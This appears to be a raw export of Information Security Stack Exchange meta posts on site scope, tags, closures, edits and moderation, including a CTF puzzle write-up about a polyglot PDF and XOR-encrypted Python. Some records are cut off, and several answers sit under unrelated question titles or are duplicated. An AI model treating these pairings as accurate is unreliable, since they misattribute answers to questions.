(Or is <code>flagKey</code> encoded in Base64? That produces <code>c0ffeedcf96d9bb849744687056cd8df</code> which isn't correct either.)</p>

<p>After the contest ended, with <a href=""https://security.stackexchange.com/users/25859/hamza"">HamZa</a>, we realized that <code>this.resolveNode(""/flagKey"")</code> returns <code>null</code> (which makes sense: there's no node called <code>/flagKey</code>).

Why no tag for Kali Linux?,"<p>First of all, Kali is not ""different"" from Backtrack, it is the rebranded name for a new version of the same product (at least, to my understanding - it's not something I handle regularly. Please correct me if I'm wrong...)    </p>

<p>In general, I tend to disagree with ALL requests for ""my question is about [X], make me a tag [X]!"" from new users.<br>
First, because usually there already other tags that could fit, but the new user is just not aware of them; and second, because by definition a tag should not have a single question. Tags are used most of all for categorization (also searching and some SEO, but most of all the categorization) - a category of one is not really a category. When there multiple questions that should be categorized together, as in ""<em>this</em> question has something in common with <em>that</em> question"", then it makes sense to create a tag for them.<br>
Tags should not be used as a list of keywords that is a replacement for, or a summary of, the question itself. Indeed, tags should not add any new information not already present in the question (not saying this is the case here, just clarifying my position).   </p>

<p>Removing the tag now just saves on tag-cleanup later, especially after it gets misused a lot.... </p>

Should we change our name to “Information Security” or “Security”?,"<p>I personally prefer ""Information Security"" because ""Security"" alone has too high a potential for drifting into really distinct areas, e.g. politic issues with regards to terrorism (""Homeland Security""), unemployment (""job security"") or police forces. It is a bit too broad to my taste.</p>

<p>Thinking about it, I would say that the point is that the site ought to be <strong>technical</strong>: questions about how security can be implemented, with always a view towards technology, not about philosophical issues. The line is hard to pinpoint, but the <em>logo</em> is not meant to be a precise definition; it should be a way to convey the right idea, if vaguely. In that view, ""Information Security"" has a technical glimmer which ""Security"" alone lacks (""InfoSec"" would even be better for that -- except for its inherent ugliness, of course).</p>

Theoretical security implications,"<p>I have no opinion on the proposal, but I thought I'd suggest how you can handle ""getting started"" questions with the existing tools at your disposal at the moment, in the absence of such a special close reason.</p>

<p>In particular, you could vote to close as ""too broad"" (because you could write an entire book on the topic) and optionally downvote (because they didn't do any research before asking).  That seems to fit the criteria for those actions.</p>
",<discussion><acceptable-question><scope>,0,,87
Theoretical security implications,"<p>I don't see the point. “Getting started” is not intrinsically a bad thing. I think your questions fall under three broad types:</p>

<ul>
<li>“Tell me all about X, I want to learn about X.” → <em>too broad</em></li>
<li>“I know nothing but I want to learn how to attack X” → “Questions asking us to break the security of a specific system for you are off-topic unless they demonstrate an understanding of the concepts involved and clearly identify a specific problem.”</li>
<li>“I know nothing but I want to learn how to secure X” → <em>too broad</em>, with a comment.</li>
</ul>

<p>I find the existing close reasons satisfactory, I don't see the point of introducing a new one. Furthermore a “getting started” close reason might give the impression that we reject newbie questions, which is not the case — if you're willing to learn, not trying to bite more than you can chew, and not asking for us to write a book, then you're welcome to ask even basic questions.</p>

Theoretical security implications,"<h1>Packed</h1>
<h2>Internals, 200 points.</h2>
<p>Solved jointly by @Gilles and @Manishearth.</p>
<p>We were presented with <a href=""https://ctf.fluxfingers.net/challenges/17"" rel=""nofollow noreferrer"">this file</a> (<a href=""http://pastebin.com/8H71VEFZ"" rel=""nofollow noreferrer"">paste</a>), which at first glance was a pdf.</p>
<p>The hints online were:</p>
<blockquote>
<p>New Challenge Published: We found a dead robot! Want to take a look at its internals?</p>
<p>Think outside the box - being several types at once like an animal that can change its color. Excuse the inaccuracy, but that's what you're searching for.</p>
</blockquote>
<p>Opening it, however, gave rise to a pdf that just said &quot;no hint given&quot;.</p>
<p>Looking deeper, it seemed to be in three parts. First, there was the pdf, which was ended with an <code>EOF</code>.</p>
<p>Secondly, there was a <a href=""http://pastebin.com/b63acAJq"" rel=""nofollow noreferrer"">bunch of gibberish</a>. Finally, there was <a href=""http://pastebin.com/j7UpFPVE"" rel=""nofollow noreferrer"">some base64-encoded data</a>.</p>
<p>Decoding the base64 data gave rise to an OpenOffice text document that said &quot;still no hint given&quot;. Looking into the file, there was some xml with the text &quot;mad forensic skillz&quot; surrounded by <code>&lt;dc:title&gt;</code> tags. Nothing too interesting here.</p>
<p>It was pretty obvious that the gibberish was code, most probably Python. I realized that it was the rot13 of some python code, and after decoding it, I got <a href=""http://pastebin.com/r4sPySYw"" rel=""nofollow noreferrer"">this</a>. Note that that is not <em>exactly</em> the rot13 of the initial gibberish, I have converted <code>qrpbqr (&quot;zip&quot;)</code> to <code>decode (&quot;zip&quot;)</code>, as Python accepts <code>zip</code> as an argument for <code>decode()</code> but not <code>mvc</code>.</p>
<p>Cleaning up the code and adding comments, we get:</p>
<pre><code>#Ciphertext to be decoded:

n = 0
import hashlib ,sys 
try :
    key = sys.argv[1] #get key from argument
except IndexError:
    sys.exit(&quot;Key 1 missing in argv&quot;)
    
f =getattr(hashlib ,&quot;md5&quot;)
while n &lt;(5*10**6):
    key = (f(key).digest()) #Repeatedly hash the key via md5
    n = n+1
key = key[:5].upper() #Take the last five characters of the new key and make them uppercase.
while len(key)&lt;len(cipher): 
    key = key *2 #Make the key as long as the ciphertext by duplicating it
plain = &quot;&quot;.join(map(chr,[ord(a)^ord(b)for a,b in zip (cipher,key)])) #XOR the key with the cipher, deciphering the OTP
try :
    exec plain #Execute the plaintext. A successful execution means that we have found the correct key.
except :
    print &quot;Wrong Key!&quot;, repr(plain)
</code></pre>
<p>Note that the actual decoding part takes a string consisting of a set of five characters repeating over and over again and pads it with the ciphertext.</p>
<p>Due to a misunderstanding of the <code>zip()</code> function, I started looking for ways to bruteforce the key (the five-byte version, not the original one before hashing) or obtain it from somewhere else.</p>
<p>At this point, @Gilles had a look. He realized that the python program would probably start with <code>import</code>. XORing <code>import</code> with the ciphertext gives us the first five characters of our repeated key; <code>!XA3U</code>. We create the repetitive key from this, and this decodes the ciphertext into:</p>
<pre><code>import sys
print &quot;Key 2 = leetspeak(what do you call a file that is several file types at once)?&quot;
if len(sys.argv) &gt; 2:
    if hash(sys.argv[2])%2**32 == 2824849251:
        print &quot;Coooooooool. Your flag is argv2(i.e. key2) concat _3peQKyRHBjsZ0TNpu&quot;
else:
    print &quot;argv2/key2 is missing&quot;
</code></pre>
<p>Running this asks us for a second key, which we have to guess from the hint &quot;What do you call a file that is several file types at once&quot;. Putting this together with the hint &quot;Being several types at once like an animal that can change its color&quot;, I get the second key as <code>ch4m3l30n</code> (chameleon), which worked. This gives us the flag <code>ch4m3l30n_3peQKyRHBjsZ0TNpu</code>.</p>

Of course we can argue that cs.SE or crypto.SE seem <em>related</em>, but that's the lot of most questions on security.SE: when there is security and computers are involved, Computer Science and cryptography are never too far away.</p>

<p>The other one (the 2046-bit question) would be better on StackOverflow because it only calls for a generic answer which explains that the ""size"" of a processor is a pure question of performance (existing computers have no trouble using 2046-bit value right now; having registers with that size may just speed up operations a bit, but not significantly). Although I could engage in a discussion comparing password cracking performance on a GPU and on a CPU with SIMD instructions (a 2048-bit register would allow for 64 32-bit operations in parallel)(a good GPU would still win, though).</p>

<p>To sum up, I see nothing wrong in theoretical questions per se. We answer theoretical questions all the time. Answers tend to have a ""practical viewpoint"" (for instance, when talking about 256-bit encryption, a security.SE answer will often explain why that's overkill in practice) but theory of security is still on-topic. Which does not prevent any particular question from being off-topic, not because it is about theory, but because it is about theory of something which is not information security.</p>

Are technical questions about programs on-topic?,"<p>It depends a fair bit on exactly what your question is about. Generally speaking [security.se] is about threat modeling and how to mitigate, respond to, or otherwise protect assets from those threads. Our involvement with cryptography generally revolves around how to use crypto and sometimes cryptographic software, occasionally this drifts more into standard application support issues that would be more appropriate on [su] or [SF]. If you want to discuss cryptographic algorithms or similar then you would be most suited to go to [crypto.se]. While our <a href=""https://security.stackexchange.com/help/on-topic"">FAQ</a> is not overly verbose on the matter it might be worth a look to get a broader notion of what we're looking for. </p>

Why was my question deleted?,"<p>In my experience, when questions are deleted or closed it is because they do not meet the fairly strict guidelines for what can and cannot be asked here (and not because a mod is out to get you).  I certainly understand your frustration, and have felt it before myself when I've had, what I thought were, legitimate questions closed or down voted.</p>

<p>Keep in mind that the StackExchange sites are the best Q&amp;A sites out there because there is such strict moderation by both official mods and the community.  Because of this you are able to find high quality answers quickly instead of wading through the BS you see on other Q&amp;A sites.</p>

<p>If you disagree with the reasons for having your question deleted/closed you should bring that concern up on the meta sites to see if the rest of the community agrees with you.  This is really the best way that you might be able to influence the direction of the sites. </p>

<p>I haven't seen which of your questions were deleted/closed, but based on my own experience on the security SE site, the moderators are not that heavy handed when it comes to deleting/closing.  I know it can be frustrating to have your question closed, but I would suggest reading through the FAQs and see if you can find a better way to ask your question.  </p>

Why was my question deleted?,"<p>I just took a look at your deleted question. It's a question regarding product recommendation, and we don't really like such questions.</p>

<p>However, you didn't stop there; you took it a little further by asking us to basically balance your decisions based on your budget. We don't really do that here and usually such questions get deleted. It's not personal. Actually, one of our moderators <a href=""https://security.stackexchange.com/users/485/rory-alsop"">Rory Alsop ♦</a> explained the reason for deletion:</p>

<blockquote>

  networking guidance or costings. If you want to speak to a Cisco
  reseller, you should just do that. –  Rory Alsop♦ 1 hour ago</p>

",<discussion>,2,,180
Why was my question deleted?,"<p>The question you posted, which was deleted, had several significant issues which did not make it fit for the StackExchange format. It therefore was deleted, with commentary from @RoryAlsop (plus a system-generated note) explaining why, because there was no foreseeable way to edit it into something which would match our format.</p>

<p>That your question appeared to be a product recommendation query is probably not the only reason it was closed or deleted, but unfortunately the system only displays the majority reason when a question is closed.</p>

<hr>

<p>Here are some issues that I see:</p>

<p><strong>Off-Topic: Product Recommendation</strong></p>

<p>The intent of this site is to host questions and answers which are <em>generally useful</em> to the Internet population at large, and which will remain so for a reasonable length of time. Asking for a specific product recommendation to fit your particular needs will most likely result in answers that are only really beneficial to you. Further, as technology does quickly progress - especially in the realm of computers, and even more so in the realm of security - answers to such questions quickly become out-dated.</p>

<p><strong>Primarily Opinion-Based</strong></p>

<p>Aside from the often subjective nature of product recommendations in general, you also asked for opinions on how certain systems measure up against one another. This is likely to result in a lot of discussion and debate amongst users, which is not what this site is intended for.</p>

<p><strong>Too Broad</strong></p>

<p>You question really was kind-of all over the place. At any given point in the post, you're asking one or more of several questions:</p>

<ul>
<li>Is anyone on here a Cisco reseller?</li>
<li>What firewall should I use?</li>
<li>What antivirus should I use?</li>
<li>What IPS should I use?</li>
<li>How can I implement a security solution, while maintaining maximum bandwidth, for 10 site-to-site VPN connections?</li>
<li>How does product X compare to product Y?</li>
</ul>

<p>These are way too many questions for one thread in the StackExchange format, and most of these questions wouldn't even be permitted if they were submitted individually anyway.</p>

<p><strong>Unclear What You Are Asking</strong></p>

<p>A comment on the question demonstrates that, even <em>if</em> Product Recommendation questions were on-topic, there was not sufficient information in the question for it to be properly answerable.</p>

<blockquote>
  <p>What's your traffic utilization look like? Peak/sustained/minimum bandwidth? Also be aware there are database-specific application firewall appliances out there, commercial and open source. It may make sense to purchase something small like a Fortigate 80c for the office, and a GreenSQL box for the server. –  RI Swamp Yankee</p>
</blockquote>

<hr>

<p>Generally, the first step for a question that doesn't appear to fit the StackExchange format is for it to be put on hold. This allows the asker an opportunity to clarify their needs and rephrase the question in a way that it can fit this site.</p>

<p>If a question remains on-hold for a certain duration, its status is changed to closed. Essentially, on-hold and close are the same thing. The on-hold term is just used initially to indicate that this question has a fair chance of being re-opened if modified quickly. Closed means that the asker has had a reasonable amount of time to modify it, but either has not cared to or has not been able to meet the StackExchange standards in that time.</p>

<p>In <em>either</em> situation - on-hold or closed - a question can be re-opened if it is changed to suit the StackExchange format. All it takes is a few votes from high-reputation users, or a single action by a moderator.</p>

<p>However, in extreme cases - like this one, where the question fits nearly every closure reason there is - a question may instead be deleted. This is reserved for a few, relatively rare, scenarios.</p>

<ul>
<li>The question is spam.</li>
<li>The question is hateful or abusive, and otherwise serves no constructive purpose.</li>
<li>Though not spam or offensive, there is no reasonable expectation that this question can be modified in a way to fit the StackExchange format and quality standards.</li>
</ul>

<p>Your question clearly fit the last of those scenarios. Part of the reasoning for this was explained in the close reason tagged to the question, and the comments. I hope I've more clearly outlined any other aspects which may have not yet been covered.</p>

<p>If anything is still unclear, I suggest perusing the <a href=""https://security.stackexchange.com/help"">Help Center</a>. There are many useful bits of information in there, including articles on how to ask a question here, what is and isn't on-topic, and reasons why questions may be closed and/or deleted. Browsing other questions on Meta, regarding question closure or deletion, may also be useful to you.</p>

Gaming the site for Hat farming,"<p>""Farming"" calls for gaming comparisons. In the famous <a href=""http://www.nethack.org/"" rel=""nofollow"">NetHack</a> game (not related to Information Security, despite the name), some people have found a way to enhance their characters to arbitrarily high levels, through a tedious process called <a href=""http://nethackwiki.com/wiki/Pudding_farming"" rel=""nofollow"">Pudding Farming</a>. Many NetHack players consider it to be somewhat of a cheat, and a debate on whether this should be disabled in the game mechanics has been triggered. A member of the fabled ""DevTeam"" (the people who come up with new NetHack versions, albeit not very often) have responded with the pearl of wisdom which, <em>mutatis mutandi</em>, tends to apply to the present hat situation equally well:</p>

<blockquote>
  <p>The DevTeam has arranged an automatic and savage punishment for pudding farming. It's called pudding farming.</p>
</blockquote>

<p>In plain words, hat-whoring is automatically punished through the tediousness of the operations needed to effectively hat-whore. In that sense, I agree with @Rory: as long as it does not break anything in the overall site mechanics, let it slide.</p>

<p>The difference with games on <strong>reputation</strong> (and badges) is that the rep count is permanent and is an element of what attracts users and keeps them active. Gaming the rep/badge system thus incurs what can be seen as permanent damage. Whereas all the hats will evaporate way before you begin to recover from New Year's hangover.</p>

<p>The boxes on the right are shown to everyone. They're guidance, not error messages. Pay attention to the actual error message when you attempt to submit the question:</p>

<blockquote>
  <p>Creating the new tags 'tea feistel' requires at least 300 reputation. Try something from the existing tags list instead.</p>
</blockquote>

<hr>

<p>A question that requires specific tags such as <a href=""https://security.stackexchange.com/questions/tagged/tea"" class=""post-tag"" title=""show questions tagged &#39;tea&#39;"" rel=""tag"">tea</a> and <a href=""https://security.stackexchange.com/questions/tagged/feistel"" class=""post-tag"" title=""show questions tagged &#39;feistel&#39;"" rel=""tag"">feistel</a> is too specialized for this site. Questions on the design and implementation techniques of cryptographic algorithms are suitable for <a href=""https://crypto.stackexchange.com/"">Cryptography Stack Exchange</a>. Questions on the actual coding belong on <a href=""https://stackoverflow.com/"">Stack Overflow</a>. Your question is borderline; most questions on the Cryptography site contain math rather than code, but since your question is focuses on modifying the algorithm rather than on a coding issue, it is more suitable for Cryptography.</p>

<p>Be sure to use the proper formatting tool: despite its name, <code>&lt;code&gt;</code> is not a very good tag to use for code, since it doesn't format the content verbatim. Use 4-space indentation for literal formatting (as used by the <code>{}</code> button or the <kbd>Ctrl</kbd>+<kbd>K</kbd> shortcut), or <code>&lt;pre&gt;</code> tags. Pay attention to the preview below the editor window (which you've shrunk down to be practically empty, drag the bottom of the editor window up to make more room for the preview), make sure it comes out right. Another formatting tip: don't use bare URLs, hyperlink some English text, like <code>[TEA source from Wikipedia](http://en.wikipedia.org/wiki/Tiny_Encryption_Algorithm)</code> (which renders as <a href=""http://en.wikipedia.org/wiki/Tiny_Encryption_Algorithm"" rel=""nofollow noreferrer"">TEA source from Wikipedia</a>).</p>

"Invalid flags for disputed ""not an answer""","<p>I think you might be misunderstanding what that stuff in your flagging history means. It's kinda exposed implementation detail though and not very intuitive.</p>

<p>When you disagree with flags on a post, you're actually adding your own flag onto the pile, with the string ""invalid flags"". So the text with the yellow background is what <em>you're</em> saying; it's not a judgment on your judgment.</p>

<p>The ""disputed"" is the outcome of said flag, which is meaningless here because you disagreeing with the existing flags actually causes the dispute. (The flags you marked as invalid get disputed as well.) Because of that, 100% of ""invalid flags"" flags come back as disputed. It might as well say ""none"" or nothing at all, but it tells you that the flags on that post have been handled.</p>

Difference between security stackexchange and cryptography stackexchange?,"<p>They are very different. There is only a very slight overlap, certainly, but that overlap on this site is only about the practical implementation of cryptography. From our faq:</p>

<blockquote>
  <p>IT Security Stack Exchange is for Information Security professionals to discuss protecting assets from threats and vulnerabilities. Topics include, but are not limited to:</p>
  
  <ul>
  <li>web app hardening</li>
  <li>network security</li>
  <li>social engineering, including phishing</li>
  <li>risk management</li>
  <li>policies</li>
  <li>penetration testing</li>
  <li>security tools</li>
  <li>using cryptography</li>
  <li>incident response</li>
  <li>physically securing the office, datacentre, information assets etc.</li>
  </ul>
  
  <p>Questions on setting up your home PC antivirus may be more appropriate over at superuser.com; and questions on the deeper aspects of cryptography belong on crypto.SE.</p>
</blockquote>

<p>and from the Crypto faq:</p>

<blockquote>
  <p>Crypto Stack Exchange is for software developers, mathematicians and others interested in cryptography.</p>
  
  <p>Cryptography Stack Exchange is for asking questions about the mathematics and properties of cryptographic systems, their analysis (""cryptanalysis"") and subsidiary topics that generally make up cryptology, such as random number generation. As such, we welcome questions on topics such as:</p>
  
  <ul>
  <li>Asymmetric and symmetric cryptographic algorithms.</li>
  <li>Cryptographic protocols.</li>
  <li>Cryptanalysis techniques.</li>
  <li>Hash functions, hashing.</li>
  <li>Entropy and information theory.</li>
  <li>Random number generation.</li>
  </ul>
</blockquote>

<p>Here we don't worry about the algorithms, or the mathematics, or theoretical attacks on a set - we are focused on what those attacks might do to the enterprise we are trying to protect.</p>

<p>So if your question is about cryptography, in almost all cases you should ask on Cryptography.SE - the exceptions are when it comes to practical implementation, and then your question may be on topic here.</p>

Editing out salutations,"<p>Hi @Jeff Gohlke great to read your question and hope you enjoy my answer.</p>

<p>I respectfully disagree that it is ""common policy"".</p>

<p>The discussions linked to indicate there is actually significant <strong>debate</strong> about whether or not intros and outtros should be retained or edited out.</p>

<p>The balance appears to have tilted in favor of ""remove intros"", but IMO a significant contributing factor to that was that @Jeff Atwood (a StackExchange developer at the time) was opposed to intros/outtros <em>and</em> <a href=""https://meta.stackexchange.com/a/93989/258026"">able to action his preference</a> by making StackExchange remove common intro statements at the time of posting.</p>

<p>As benevolent dictator, this is/was his prerogative, but the community preference appears to have stopped short of ""edit out every intro/outtro that you see"". (I <em>think</em> - perhaps there is more aggressive editing on the busier sites).</p>

<p>I personally subscribe to the ""<a href=""https://meta.stackexchange.com/a/2956/258026"">accept intro/outtro removal if part of a wider edit to the post, reject if it is the only change</a>"" school of thought. My main concern is that new users (who are most likely to include intro/outtro remarks if they are trying to be polite, and politeness is a great thing and should be encouraged) will be put off by such editing.</p>

<p>Thanks and hope you have a great day!</p>

<p>*Yes, I have deliberately included an extended intro/outtro here in a possibly misplaced attempt at humour.</p>

<p>Edit: Furthermore, if it were common policy we wouldn't need to have this discussion :)</p>

I'd like to migrate my question to crypto.SE,"<p>The rejection reason “too minor” was introduced for several reasons:</p>

<ul>
<li>Edits bump a post on the home page, giving the thread more attention. This is desirable in case something major has changed, but not to fix a typo.</li>
<li>Suggested edits cost time for the reviewers.</li>
<li>Each edit used to bring the post closer to community wiki status — but as you note this is no longer the case.</li>
</ul>

<p>The third reason no longer applies. The second one does, but only to a small extent: manpower for suggested edit review used to be scarce on Stack Overflow, but now it is no longer, and it never was to my knowledge on any other Stack Exchange site. The first reason still applies, but it isn't a big deal unless a lot of minor edits happen (and it's a big deal even for major edits if there are a lot of them).</p>

<p>There's been much debate lately on <a href=""https://meta.stackexchange.com/"">Meta Stack Exchange</a> and <a href=""https://meta.stackoverflow.com/"">Meta Stack Overflow</a>, with opinions ranging from generic frustration against suggested edits to wanting to do away with “too minor” altogether. Given the complete lack of consensus, don't expect the reason to disappear or change.</p>

<p>I only use “too minor” in a few cases:</p>

<ul>
<li>The suggestion isn't really an improvement, it's only cosmetic. For example, an edit that standardizes a post that mixes British and American spellings (on a site other than ELU or ELL, where that can be important).</li>
<li>The suggestion corrects a few problems but there are many other glaring problems. For example, an edit that fixes the spelling of one word while leaving many other grammatical mistakes, or an edit that removes an inappropriate tag but doesn't add other tags that the question sorely needs.</li>

Bug: page 9 and 10 of the questions ranked by votes show wrong questions,"<p>This is the joy of Hot Network Questions.  All of the questions you mentioned were recently featured in the Hot Network Questions sidebar, which is shown on all sites.  Many Stack Exchange users (including lots of people who are not members of the Security.SE community) see those questions and click on them.</p>

<p>This exposure has advantages and disadvantages.  The advantage is that we get more exposure for these questions and can document answers to some questions of broad interest.  Others elsewhere on the Stack Exchange network benefit from this knowledge, or at least have moment of entertainment and intellectual enrichment.</p>

<p>The disadvantage is that we get a massive influx of people viewing and voting on these questions and answers, many of whom might not be members of the Security.SE community and might not be information security professionals. Anyone who has at least 200 reputation on any Stack Exchange site anywhere can <a href=""http://blog.stackoverflow.com/2009/07/cross-site-account-associations/"">associate their account</a> with Security.SE with just one or two clicks, and they are instantly provided an account on Security.SE with 101 reputation.  This gives them the privilege to upvote (but not downvote) questions and answers.  Also, the exposure sometimes prompts others to try answering the question.</p>

<p>So, when a question gets featured as a Hot Network Question, it often accumulates more answers than usual (sometimes from people who might not have previously been a member of Security.SE), and the question and answers often get many upvotes from folks passing by from another site.  As a result, vote counts on Hot Network Questions can be pretty dubious and don't always reflect the Security.SE community's views; votes from new folks can outnumber votes from our own active members.  So, the votes on these questions aren't always reliable, and the answers aren't always reliable, either.</p>

<p>I've noticed that a bunch of the questions I've seen featured on Hot Network Questions have been what I would consider to be lower-quality: they did not show much evidence of prior research, many were duplicates or were a variant of something that had been previously asked, and they might be about something of broad interest but that maybe an information security professional would likely already know.</p>

<p>So, I think these might be isolated cases that don't necessarily reflect the rest of the questions on this site.  I'm not convinced we need to change the tour page, create two sites, change the scope, or anything like that.  Overall, things seem to be working pretty well, apart from these exceptional cases caused by Hot Network Questions.</p>

<p>There's not a lot we can do about the effects of questions being featured in Hot Network Questions.  About all we can do is try to moderate these questions rapidly: vote on them; if they need to be closed, place appropriate close votes; when there are many answers encourage moderators to clean things up and delete answers that don't add much (e.g., by flagging the poor/incomplete answers for deletion, even if they have some upvotes), etc.</p>

<p>One thing you can do: if you see a Hot Network Question that has attracted poor answers from drive-by users, please flag it for moderator attention and ask the moderators to protect the question.  This will ensure that the question can only be answered by users who have earned >= 10 reputation points on this site.  This situation is exactly the sort of thing that protected questions were <a href=""https://meta.stackexchange.com/a/212835/160917"">designed to solve</a>.</p>

Asking about software solutions,"<p>This has been discussed a few times in the past.  The reference answer for the general Stack Exchange position on product recommendations (shopping questions) is this blog post: <a href=""http://blog.stackoverflow.com/2010/11/qa-is-hard-lets-go-shopping/"">Q&amp;A is Hard, Let’s Go Shopping!</a></p>

<p>That said, is there room for product recommendations?  Yes, probably, but the biggest problem we have with tool questions here is that they tend to be lousy questions.  They're either too vague for good answers, or too open to opinion-bases answers, and sometimes as you alluded to, apply to subjects that are too volatile for an answer to be valid for long, though I think that's less of a problem here than for say, SuperUser and hardware recommendations. </p>

<p>Ultimately we've tended to err on the side of culling product recommendation questions, but I think the decisions to close are usually appropriate regardless, and we do often discuss, and always welcome tools questions in <a href=""http://chat.stackexchange.com/rooms/151/the-dmz"">The DMZ</a>. </p>

<p>From meta:</p>

<blockquote>
  <p>...the same algorithm that drives question and answer bans on all other Stack Exchange sites, drives question and answer bans on Meta. The difference is, the threshold is much higher on Meta. Generally, on Stack Overflow, you can expect to be banned if a small handful your posts are in the negative, if you're a new user. You get more on Meta, a lot more in my experience. But the basic algorithm is the same.</p>

",<discussion>,7,,182
Asking about software solutions,"<p>In my experience, having a big list of canonical questions isn't very manageable. Tagging questions as <a href=""https://security.stackexchange.com/questions/tagged/canonical"" class=""post-tag"" title=""show questions tagged &#39;canonical&#39;"" rel=""tag"">canonical</a> or some such (the way meta questions are tagged <a href=""https://security.stackexchange.com/questions/tagged/meta-faq"" class=""post-tag"" title=""show questions tagged &#39;meta-faq&#39;"" rel=""tag"">meta-faq</a>) isn't very nice either because each question then stands individually. It's better to have questions organized by topic.</p>

<p>Fortunately, Stack Exchange already has a way to classify questions by topics: with tags. And tags have a place for canonical questions: <strong>the tag wiki</strong>.</p>

<p>If you think a thread covers an important aspect of a topic, and in particular if it's a good potential target for duplicate closure, add it to a list in the tag wiki for the tag that best describes the topic.</p>

<p>You can build up lists of existing canonical question by looking at the most-upvoted questions in a tag. Don't blindly take the <a href=""https://security.meta.stackexchange.com/questions/1585/are-the-wrong-questions-and-answers-getting-too-many-upvotes"">most-upvoted questions</a> though: sometimes the questions cover overlapping questions and are redundant, sometimes the questions are popular trivia of little general interest, etc. The votes are a hint but are not what intrinsically makes a question canonical. Also the canonical question lists should only list questions with a good answer.</p>

<p>On <a href=""https://unix.stackexchange.com/"">Unix &amp; Linux</a>, I try to maintain lists of common questions in tag wikis (but these lists aren't nearly complete or ubiquitous). I've standardized on “Further reading” as a title for the canonical questions section — perhaps not the best choice.

Asking about software solutions,"<p>The problem with tool recommendations is that they tend to end up with a haphazard collection of answers:</p>

<ul>
<li>I like Pai.</li>
<li>Pai sucks, use the Tao fork.</li>
<li>Most customers are dissatisfied with their vulnerability report compiler. Yoyodyne ReportCompiler solves world hunger and has military-grade 11000-bit encryption!</li>
<li>You should totally drop that and use jQuery!</li>
<li><a href=""http://example.com/dead/link"" rel=""nofollow noreferrer"">use this</a></li>
</ul>

<p>In order to work, they need to be moderated more than the average question. This goes both for the questions and for the answers.</p>

<ul>
<li>Questions should explain what the asker wants to do — not just “what's the best vulnerability report compiler?” but “I want a tool to help me categorize and prioritize vulnerabilities and collect findings into an organized presentation. I do penetration tests on web servers. The tool should take this kind of inputs and produce this kind of outputs.”</li>
<li>Answers should not just mention a tool without explanation, they should be tailored to the requirements in the question. If you can imagine your answer copied word-for-word on another question, you're doing it wrong.</li>
</ul>

<p>This is an overview of the <a href=""https://softwarerecs.meta.stackexchange.com/questions/336/what-is-required-for-a-question-to-contain-enough-information"">question guidelines</a> and <a href=""https://softwarerecs.meta.stackexchange.com/questions/356/what-is-required-for-an-answer-to-be-high-quality"">answer guidelines</a> that we have and <strong>enforce</strong> on <a href=""https://softwarerecs.stackexchange.com/"">Software Recommendations Stack Exchange</a> (evolved after a few weeks of beta from some <a href=""https://softwarerecs.meta.stackexchange.com/questions/455/how-to-ask-and-answer-software-recommendation-questions-aka-the-ground-rules"">ground rules</a>). Enforcement is important — if an answer doesn't have any explanation, even if it's massively upvoted because it's a popular tool, we'll delete it.</p>

<p>Does Software Recommendations Stack Exchange work? In my opinion (I'm a moderator there), it works in terms of keeping the spam and the crud out. It doesn't work all that well in producing quality answers — we cull the bad ones (as well as the questions that don't call for answers with added value) but we do have a problem getting good ones. I think that in terms of moderation, SR.SE is successful, but in terms of producing answers — which is what it's all about — it's less than optimal. It would be best if the SR.SE questions were shown to the respective experts (on Stack Overflow, Super User, Server Fault, Security, etc.).</p>

<p>I'd like to avoid a blanket ban on anything that looks like a tool recommendation. If a question <strong>asks how to solve a problem</strong> and a valid answer happens to be “use this existing tool”, so be it.</p>

Asking about software solutions,"<p>Using many related sites, the framework has all of the right controls and balances IMHO but... in this particular case what is lacking is better moderation.

Asking about software solutions,"<p>MathOverflow and Math SE are a special case. For those who are unfamiliar: anyone can create an account on MO, but in practice, the community is largely restricted to research mathematicians (think people who have doctorates in mathematics and work at universities); on the other hand, Math SE is more of a ""typical"" SE site.</p>

<p>MO was originally started as a Stack Exchange 1.0 site, in the days before Area 51 existed. The SE 1.0 system, in a nutshell, allowed anyone with enough money to buy a copy of the SE software and start a Q&amp;A site about any topic. Most of the sites that were started in the SE 1.0 days failed; MO is one of the few exceptions. After some discussion on both sides, we eventually worked out a way for them to join the current network, but by that time, Math SE already existed.</p>

<p>The point of this short history lesson is that MO and Math SE shouldn't be used as a model for other sites. We really don't like the idea of splitting up a topic into ""the experts"" and ""everyone else."" Aside from having an uncomfortable elitist vibe, that hurts the chances for most people to get good answers.</p>

Top Questions without accepted answer,"<p>MathOverflow and Math SE are a special case. For those who are unfamiliar: anyone can create an account on MO, but in practice, the community is largely restricted to research mathematicians (think people who have doctorates in mathematics and work at universities); on the other hand, Math SE is more of a ""typical"" SE site.</p>

<p>MO was originally started as a Stack Exchange 1.0 site, in the days before Area 51 existed. The SE 1.0 system, in a nutshell, allowed anyone with enough money to buy a copy of the SE software and start a Q&amp;A site about any topic. Most of the sites that were started in the SE 1.0 days failed; MO is one of the few exceptions. After some discussion on both sides, we eventually worked out a way for them to join the current network, but by that time, Math SE already existed.</p>

<p>The point of this short history lesson is that MO and Math SE shouldn't be used as a model for other sites. We really don't like the idea of splitting up a topic into ""the experts"" and ""everyone else."" Aside from having an uncomfortable elitist vibe, that hurts the chances for most people to get good answers.</p>

"Why do people keep putting ""+1 for .... "" in the comments?","<p>AviD explains the reason very well:</p>

<blockquote>
  <p>To put it simply (and as politely as I can): <a href=""http://xkcd.com/1386/"" rel=""nofollow noreferrer"">on average, people are of average intelligence</a>. People like to be heard, and possibly to focus their approval on the one specific part. Or maybe they are hoping to share in the bear greatness of a particularly shining statement by simple repetition, thus granting them too the reflected moonglow of assumed greatness.</p>
</blockquote>

<p>More importantly, what can we do about it?</p>

<ul>
<li>flag it for moderator attention and we'll remove it</li>
</ul>

<p>Nice and simple. You don't need to add a comment letting them know it is unnecessary. Mods do delete comments that are obsolete, too chatty, spam, nonsense etc when we see them, but you can help us see them by flagging.</p>

<p>From the <a href=""https://meta.stackexchange.com/a/19757/154443"">canonical meta post</a>, Comments are:</p>

<blockquote>
  <p>Comments are temporary ""Post-It"" notes left on a question or answer. You should not expect them to be around forever: Once a clarification has been made, an edit added to the post to include new information, or the issue in the comment is otherwise resolved, it is subject to deletion. In reality, many obsolete or chatty comments remain untouched due to the high volume of comments posted, but this does not mean that they can't or shouldn't be deleted in the future.</p>
</blockquote>
",<discussion><feature-request>,15,,740
"Why do people keep putting ""+1 for .... "" in the comments?","<p>Stack Exchange is built on the idea that all the information is made public (except who voted for what). They even frown on private chat rooms. Thus, the best practice for private or sensitive information is to abstain from publishing it.</p>

